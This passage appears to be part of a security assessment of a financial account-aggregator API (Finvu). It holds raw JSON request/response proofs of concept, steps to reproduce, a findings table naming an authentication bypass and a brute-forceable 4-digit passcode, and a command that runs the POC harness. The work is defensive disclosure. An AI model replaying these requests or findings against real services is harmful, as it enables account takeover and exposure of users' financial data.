    "txnid": "a0ee4a12-86ce-4e25-91b8-a5f562a2d326",
    "FIDataRange": { "from": 1748248023000, "to": 1748249000000 },
    "Consent": { "id": "42f12d7e-141f-4d82-87b7-9715c3cc62dc", "digitalSignature": "" },
    "KeyMaterial": { "cryptoAlg": "ECDH", "curve": "Curve25519", "params": "",
      "DHPublicKey": { "expiry": "2026-08-07T12:08:20.794+05:30",
        "KeyValue": "MCowBQYDK2VuAyEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "Parameters": "" },
      "Nonce": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=" }
  }
}
```

**Response**
```json
{
  "header": {
    "mid": "98ac994c-12c4-4b32-8c5b-0933bc6455a8",
    "ts": "2026-08-07T06:38:21.303+00:00",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "dup": false,
    "type": "urn:finvu:in:app:res.accountDataRequest.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "status": "FAILURE",
    "message": "Invalid consent details.",
    "code": null,
    "ver": null, "timestamp": null, "txnid": null,
    "consentId": null, "sessionId": null
  }
}
```

> **Interpretation:** `accountDataRequest` resolves the consent by `Consent.id`; an intentId is not a valid consent handle here. (Contrast with `getConsentDetails`, which accepts both — POC BL-8.)

### Step 3 — REVOKED+EXPIRED consentId → "Consent is revoked." (post-revoke enforcement works)

**Request** (`Consent.id` = revoked consent `b22ce5c1-2f75-4a19-83bb-165ab4a91268`)
```json
{
  "header": {
    "mid": "9f4c1cae-0d98-4239-8b3a-ce69a6b8ed24",
    "ts": "2026-08-07T12:08:21.345+05:30",
    "dup": false,
    "type": "urn:finvu:in:app:req.accountDataRequest.01",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "ver": "2.0.0",
    "timestamp": "2026-08-07T12:08:21.345+05:30",
    "txnid": "8e5e8896-4e80-451b-ab0c-b1796eb0fd1b",
    "FIDataRange": { "from": 1748248023000, "to": 1748249000000 },
    "Consent": { "id": "b22ce5c1-2f75-4a19-83bb-165ab4a91268", "digitalSignature": "" },
    "KeyMaterial": { "cryptoAlg": "ECDH", "curve": "Curve25519", "params": "",
      "DHPublicKey": { "expiry": "2026-08-07T12:08:20.794+05:30",
        "KeyValue": "MCowBQYDK2VuAyEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "Parameters": "" },
      "Nonce": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=" }
  }
}
```

**Response**
```json
{
  "header": {
    "mid": "9f4c1cae-0d98-4239-8b3a-ce69a6b8ed24",
    "ts": "2026-08-07T06:38:21.379+00:00",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "dup": false,
    "type": "urn:finvu:in:app:res.accountDataRequest.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "status": "FAILURE",
    "message": "Consent is revoked.",
    "code": null,
    "ver": null, "timestamp": null, "txnid": null,
    "consentId": null, "sessionId": null
  }
}
```

> **Interpretation (positive control):** a revoked consent is correctly rejected *before* the unsigned-signature check — the server checks consent status first. This confirms post-revoke data-fetch enforcement works (BL-2 PASS).

### Steps to reproduce (BL-1)
1. Establish the bypass sid (POC-1 Step 1).
2. Harvest an ACTIVE consentId and a REVOKED consentId from `res.getUserConsent.01`.
3. Send `req.accountDataRequest.01` with the active consentId → `"Invalid key."` (reached the consent-validation layer; not an auth rejection).
4. Send with the revoked consentId → `"Consent is revoked."` (status enforced).

---

## POC BL-8 — getConsentDetails accepts BOTH consentId and intentId (ID-resolution behavior)

**Behavior:** `getConsentDetails` resolves both forms; `accountDataRequest` accepts only the consentId. This is documented behavior worth knowing for POC crafting — when you only have an intentId from `getUserConsent`, call `getConsentDetails` first to read the canonical `consentId` from the response.

### Step 1 — getConsentDetails(consentId `4b402bd9-...`) → SUCCESS

**Request** `urn:finvu:in:app:req.getConsentDetails.01`
```json
{
  "header": {
    "mid": "fdacbfc8-d919-4d98-b807-bb00c5575b32",
    "ts": "2026-08-07T12:08:20.669+05:30",
    "dup": false,
    "type": "urn:finvu:in:app:req.getConsentDetails.01",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "consentId": "4b402bd9-a0e1-4c06-b0de-a04852fbefc9",
    "userId": "7666213741@finvu"
  }
}
```

**Response** (trimmed; full body in `/tmp/fv_poc2.log` lines 580–670)
```json
{
  "header": {
    "mid": "fdacbfc8-d919-4d98-b807-bb00c5575b32",
    "ts": "2026-08-07T06:38:20.679+00:00",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "dup": false,
    "type": "urn:finvu:in:app:res.getConsentDetails.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "status": "SUCCESS",
    "message": null,
    "code": "F200",
    "consentId": "4b402bd9-a0e1-4c06-b0de-a04852fbefc9",
    "consentStatus": "ACTIVE",
    "FIP": { "id": "BARB0KIMXXX", "name": "Finvu Bank" },
    "AA": { "id": "cookiejar-aa@finvu.in" },
    "Accounts": [{ "linkRefNumber": "97e5b766-2121-44e6-b096-c2566246c5bf", "maskedAccNumber": "XXXXX6727", "fipId": "BARB0KIMXXX" }],
    "Signature": null,
    "DataDateTimeRange": { "from": "2025-05-26T07:17:03.000+00:00", "to": "2027-05-26T07:17:03.000+00:00" },
    "Frequency": { "unit": "MONTH", "value": 45 }
  }
}
```

### Step 2 — getConsentDetails(intentId `42f12d7e-...`) → SUCCESS (same API, different ID form)

**Request** `urn:finvu:in:app:req.getConsentDetails.01`
```json
{
  "header": {
    "mid": "25e6a7e0-1032-4fb5-93fc-00903e15c4a1",
    "ts": "2026-08-07T12:08:20.726+05:30",
    "dup": false,
    "type": "urn:finvu:in:app:req.getConsentDetails.01",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "consentId": "42f12d7e-141f-4d82-87b7-9715c3cc62dc",
    "userId": "7666213741@finvu"
  }
}
```

**Response** (trimmed; full body in `/tmp/fv_poc2.log` lines 690–791 — note `FIU: {id: "fiu@jainambroking", name: "Jainam"}` appears on the intentId form)
```json
{
  "header": {
    "mid": "25e6a7e0-1032-4fb5-93fc-00903e15c4a1",
    "ts": "2026-08-07T06:38:20.752+00:00",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "dup": false,
    "type": "urn:finvu:in:app:res.getConsentDetails.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "status": "SUCCESS",
    "code": "F200",
    "consentId": "42f12d7e-141f-4d82-87b7-9715c3cc62dc",
    "consentStatus": "ACTIVE",
    "AA": { "id": "cookiejar-aa@finvu.in" },
    "FIU": { "id": "fiu@jainambroking", "name": "Jainam" },
    "Accounts": [{ "linkRefNumber": "97e5b766-2121-44e6-b096-c2566246c5bf", "maskedAccNumber": "XXXXX6727" }],
    "Signature": null
  }
}
```

> **Note for POC crafting:** the intentId response exposes the **FIU** (`fiu@jainambroking` / `Jainam`) — useful for mapping which third party a consent was granted to. The consentId response exposes the **FIP** instead. To fetch data you must then use the canonical `consentId` (use `getConsentDetails` to resolve it from an intentId).

---

## POC BL-7 — Finding (LOW): consent-revoke lacks a state-machine guard

**Vulnerability:** revoking a consent that is **already REVOKED** returns `SUCCESS` ("is REVOKED") instead of a no-op / "already revoked". A nonexistent consent returns `Bad Request`. This indicates the revoke handler does not validate the consent's current state — missing state-machine guard.

**Request** `urn:finvu:in:app:req.consent-revoke.01` (on already-revoked consent `b22ce5c1-...`)
```json
{
  "header": {
    "mid": "cf156ae9-57ed-452b-85ce-9deb45478571",
    "ts": "2026-08-07T12:08:21.420+05:30",
    "dup": false,
    "type": "urn:finvu:in:app:req.consent-revoke.01",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "userId": "7666213741@finvu",
    "consentId": "b22ce5c1-2f75-4a19-83bb-165ab4a91268",
    "revokeType": "REVOKED",
    "accountAggregator": { "id": "cookiejar-aa@finvu.in" },
    "fipDetails": { "fipId": "BARB0KIMXXX", "fipName": "Finvu Bank" }
  }
}
```

**Response** `urn:finvu:in:app:res.consent-revoke.01`
```json
{
  "header": {
    "mid": "cf156ae9-57ed-452b-85ce-9deb45478571",
    "ts": "2026-08-07T06:38:21.450+00:00",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "dup": false,
    "type": "urn:finvu:in:app:res.consent-revoke.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "status": "SUCCESS",
    "message": "Consent id : b22ce5c1-2f75-4a19-83bb-165ab4a91268 is REVOKED",
    "code": "F200"
  }
}
```

### Steps to reproduce
1. Harvest a consent that is already `REVOKED` (from `res.getUserConsent.01`).
2. Send `req.consent-revoke.01` with `revokeType: "REVOKED"` on it.
3. Observe `SUCCESS` + "is REVOKED" — no state check. (A truly guarded handler would return no-op / 409 / "already revoked".)

---

## POC BL-6 — chpassword DOES verify the current passcode (positive control / INFO)

**Behavior:** `chpassword` rejects a wrong `oldPassword` — the current-passcode check is enforced. Field names are `oldPassword`/`newPassword`/`rePassword`. Minor note: `new == re` is checked **before** `oldPassword` (a mismatched pair returns a different message).

**Request** `urn:finvu:in:app:req.chpassword.01` (wrong oldPassword)
```json
{
  "header": {
    "mid": "7e0637f4-8d40-453b-8e65-f01b5c7b741a",
    "ts": "2026-08-07T12:08:21.491+05:30",
    "dup": false,
    "type": "urn:finvu:in:app:req.chpassword.01",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "username": "7666213741@finvu",
    "oldPassword": "WRONGOLD",
    "newPassword": "NewStrong123!",
    "rePassword": "NewStrong123!"
  }
}
```

**Response** `urn:finvu:in:app:res.chpassword.01`
```json
{
  "header": {
    "mid": "7e0637f4-8d40-453b-8e65-f01b5c7b741a",
    "ts": "2026-08-07T06:38:21.517+00:00",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "dup": false,
    "type": "urn:finvu:in:app:res.chpassword.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "status": "FAILURE",
    "message": "Password changed failed. Make sure old password is correct.",
    "code": null
  }
}
```

> **Result (PASS):** old-password is verified. This is a **positive control**, not a vulnerability — it confirms the password gate that Finding 1 says is the sole factor is at least consistently applied to passcode changes.

---

# Findings summary

| ID | Severity | Title | One-line |
|---|---|---|---|
| F1 | **CRITICAL** | Authentication bypass | `login.01` ignores `deviceSecret.secret`, `deviceId`, and `deviceSimBindingValid`; password is the sole factor; bogus-TOTP/fabricated-deviceId session reaches all data APIs |
| F2 | **HIGH** | 4-digit passcode, no lockout | No brute-force lockout/delay/CAPTCHA across 5 wrong attempts; semi-public handle → 10k-passcode brute force → takeover |
| F3 | **MEDIUM** | Financial metadata disclosure | Unbound (sim-binding=false) session enumerates accounts (masked numbers, refs), full consent history (all FIUs), consent report CSV |
| F4 | **LOW** | Session DoS + activity oracle | One-session-per-user lets an attacker force-logout the victim's sid; "already logged in" RETRY leaks live-session status |
| BL-1 | (corroborates F1) | Bypass reaches data-fetch authz | bypass sid accepted at `accountDataRequest` layer — returns consent/key errors, not auth rejections |
| BL-7 | **LOW** | consent-revoke no state guard | re-revoking an already-REVOKED consent → SUCCESS (no state-machine check) |
| BL-6 | PASS/INFO | chpassword verifies oldPassword | current-passcode check enforced (positive control) |
| BL-8 | INFO | ID-resolution behavior | `getConsentDetails` accepts consentId and intentId; `accountDataRequest` requires consentId |
| BL-2 | PASS | post-revoke enforcement | `accountDataRequest` on revoked consent → "Consent is revoked." |
| BL-3/4 | INCONCLUSIVE | fiDataRange guards | unsigned dev consents fail at signature check before the range check; re-test with a signed consent |

## Positive controls confirmed
- Post-login APIs **do** enforce `sid` (the bypass is at login, not the API layer).
- No cross-user IDOR — every API is scoped to the sid's user.
- `logout` acts on the sid, not the supplied `userId`.
- `userAccountUnregister` re-verifies the password.
- Input validation rejects malformed `accountConsentRequest`/`discover`/`confirm-token`/`unlinking`.
- No user enumeration via pre-login errors (uniform "Invalid username or password.").
- Post-revoke data fetch is blocked (BL-2).
- `chpassword` verifies the current passcode (BL-6).
- `accountDataRequest` enforces consent-ID resolution and consent-signature validation (BL-8 / BL-1).

---

## Appendix — reproduction harness

- `finvu_ws_test.py` — WS client + helpers (connect, `_header`, `call`, `now_ts`, `load_config`).
- `finvu_poc.py` — the POC runner that produced `/tmp/fv_poc2.log` (verbatim capture of every request/response above).
- `finvu_coverage.py` — clean 37-API coverage run (one login, no churn).
- `finvu_lockout_probe.py` — the 6-attempt lockout probe that established Finding 2.
- `/tmp/fv_poc2.log` — the verbatim 1462-line capture transcribed into Part B.

Run order to reproduce end-to-end:
```bash
python3 finvu_poc.py 2>&1 | tee /tmp/fv_poc2.log
```